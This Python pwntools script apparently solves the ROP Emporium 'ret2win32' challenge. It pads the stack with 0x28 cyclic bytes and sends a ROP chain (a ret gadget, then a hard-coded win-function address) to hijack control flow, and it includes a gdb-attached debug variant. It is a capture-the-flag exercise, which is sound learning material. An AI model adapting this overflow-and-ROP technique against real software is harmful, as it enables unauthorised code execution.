#!/usr/bin/env python
# -=-<[ Bismillahirrahmanirrahim ]>-=-
# -*- coding: utf-8 -*-
# @Date    : 2022-03-01 04:47:47
# @Author  : Dahir Muhammad Dahir (dahirmuhammad3@gmail.com)
# @Link    : link
# @Version : 1.0.0


from pwn import *

context.arch = "i386"

filename = "./ret2win32"
target_binary = ELF(filename)
target_process = process(filename)


def exploit():
    exploit_rop = ROP(target_binary)
    target_process.recvuntil(b">")
    
    # fill the stack with trash
    trash = cyclic(0x28)

    # gadgets
    pwn_address = 0x0804862c
    ret_address = exploit_rop.find_gadget(["ret"]).address
    log.info(f"ret_address: {hex(ret_address)}")

    # Build the ROP chain
    exploit_rop.raw(ret_address)
    exploit_rop.raw(pwn_address)
    chain = exploit_rop.chain()
    log.info(f"exploit_rop: ")
    print(exploit_rop.dump())

    # exploit target
    target_process.send(trash + chain)
    target_process.interactive()


def debug():
    gdbscript = """
    break *0x08048616
    start
    continue
    """
    gdb.attach(target_process, gdbscript=gdbscript)
    target_process.recvuntil(b">")
    trash = cyclic(0x28)
    debug_rop = ROP(target_binary)
    pwn_address = 0x0804862c
    ret_address = debug_rop.find_gadget(["ret"]).address
    log.info(f"ret_address: {hex(ret_address)}")
    debug_rop.raw(ret_address)
    debug_rop.raw(pwn_address)
    chain = debug_rop.chain()
    log.info(f"debug_rop: ")
    print(debug_rop.dump())
    target_process.send(trash + chain)
    target_process.interactive()


if __name__ == "__main__":
    # debug()
    exploit()